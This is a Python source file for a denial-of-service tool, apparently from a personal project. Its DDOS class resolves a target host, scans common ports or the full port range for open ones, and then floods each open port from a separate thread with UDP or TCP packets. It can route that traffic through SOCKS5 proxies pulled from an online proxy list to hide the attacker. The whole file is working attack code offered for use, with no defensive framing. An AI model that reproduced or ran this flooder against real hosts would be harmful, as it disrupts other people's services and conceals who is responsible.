import socks
import threading
import proxy 
from tqdm import tqdm


def progressBar(iterable, prefix = '', suffix = '', decimals = 1, length = 100, fill = '█', printEnd = "\r"):
    total = len(iterable)
    def printProgressBar (iteration):
        percent = ("{0:." + str(decimals) + "f}").format(100 * (iteration / float(total)))
        filledLength = int(length * iteration // total)
        bar = fill * filledLength + '-' * (length - filledLength)
        print(f'\r{prefix} |{bar}| {percent}% {suffix}', end = printEnd)
    printProgressBar(0)
    for i, item in enumerate(iterable):
        yield item
        printProgressBar(i + 1)
    print()

class DDOS:
    def __init__(self,address:str) -> None:
        self.Common_Ports=[53,80, 443, 21, 22, 110, 995, 143, 993, 25, 26, 587, 3306, 2082, 2083, 2086, 2087, 2095, 2096, 2077, 2078]
        if (address.replace('https://','').replace('http://','').split('.')[0]).isdigit():
            self.ip=address
            #if not (urllib.request.urlopen(address).getcode()) == 200 :raise ConnectionAbortedError
            try:socks.socket.gethostbyaddr(address)
            except:raise ConnectionAbortedError
        else:
            try:
                self.ip=self.IP(address.replace('https://','').replace('http://',''))
            except:raise ConnectionAbortedError
        print(f'Connected to {address}')
    

    def Port_Acticity_Cheak(self,port:int):
        s = socks.socksocket(socks.socket.AF_INET, socks.socket.SOCK_STREAM)
        s.settimeout(0.15)
        result = s.connect_ex((self.ip, port)) #'142.250.185.46' google
        s.close()
        if result == 0:return True
        else:return False 

    def IP(self,site:str):
        return socks.socket.gethostbyname(site)

    def Common_Ports_Cheacker(self):
        active_ports=[]
        for i in self.Common_Ports:
            try:result=self.Port_Acticity_Cheak(i)
            except:continue
            if result==True:
                active_ports.append(i)
                if i not in self.Common_Ports:self.Common_Ports.append(i)
                print(active_ports)
        self.active_port=active_ports
        return active_ports

    def All_Port_Cheaker(self):
        active_ports=[]
        for i in progressBar(range(1,65535)):
            try:result=self.Port_Acticity_Cheak(i)
            except:continue
            if result==True:
                active_ports.append(i)
                print(f'Active Port { active_ports}')
                if len(active_ports) >= 2 :
                    text=input(f'{len(active_ports)} active ports has founded ! do you want to continue ? y/n')
                    if text.lower() == 'n':break
        self.active_port=active_ports
        return active_ports

    def Send_Packets(self,port:int,num:int,Proxy):
        x=0
        if Proxy:
            try:
                s = socks.socksocket(socks.socket.AF_INET, socks.socket.SOCK_DGRAM)
                online_proxy=proxy.get_proxy()
                s.set_proxy(socks.SOCKS5,online_proxy['hostname'],online_proxy['port'])
            except:raise ConnectionError
            #s.connect((self.ip,port),None)#online_proxy['hostname'],online_proxy['port']
        else:s =s = socks.socket.socket(socks.socket.AF_INET, socks.socket.SOCK_DGRAM)
        #s.connect((self.ip,port))
        pbar = tqdm(range(num))
        pbar.set_description(f'| Attacking to ip:{self.ip} port:{port} |')
        for i in pbar:
            try:
                s.sendto(b'www.github.com/amiralirj', (self.ip,port))
                x+=1
            except:break
        print(f'{x} Packets has sended to (ip:{self.ip}) | (port:{port}) ')
        return

    def TCP_Packets(self,port:int,num:int,Proxy):
        x=0
        if Proxy:
            try:
                s = socks.socksocket(socks.socket.AF_INET, socks.socket.SOCK_STREAM , socks.socket.IPPROTO_TCP)
                online_proxy=proxy.get_proxy()
                s.set_proxy(socks.SOCKS5,online_proxy['hostname'],online_proxy['port'])
            except:raise ConnectionError
            #s.connect((self.ip,port),None)#online_proxy['hostname'],online_proxy['port']
        else:s =s = socks.socket.socket(socks.socket.AF_INET, socks.socket.SOCK_DGRAM)
        #s.connect((self.ip,port))
        pbar = tqdm(range(num))
        pbar.set_description(f'| Attacking to ip:{self.ip} port:{port} |')
        s.connect((self.ip,int(port)))
        for i in pbar:
            try:
                s.send(b'www.github.com/amiralirj')
                x+=1
            except Exception as e:print(e)
        #print(f'{x} Packets has sended to (ip:{self.ip}) | (port:{port}) ')
        return
    
    def Attack(self,num,Proxy,UDP):
        for i in self.active_port:
            if UDP:
                threading.Thread(target=self.Send_Packets,args=[i,num,Proxy]).start()
            else:
                threading.Thread(target=self.TCP_Packets,args=[i,num,Proxy]).start()

    def Load_proxies(self):
        print('Loading Proxies !\n please wait ... ')
        for i in proxy.proxy_getter(False) :
            print(f'{i} has succesfully regesterd in file ')
    
def Load_Automaticaly_Proxy():
    threading.Thread(target=proxy.proxy_getter).start()

def proxy_sender():
    return proxy.get_proxy()

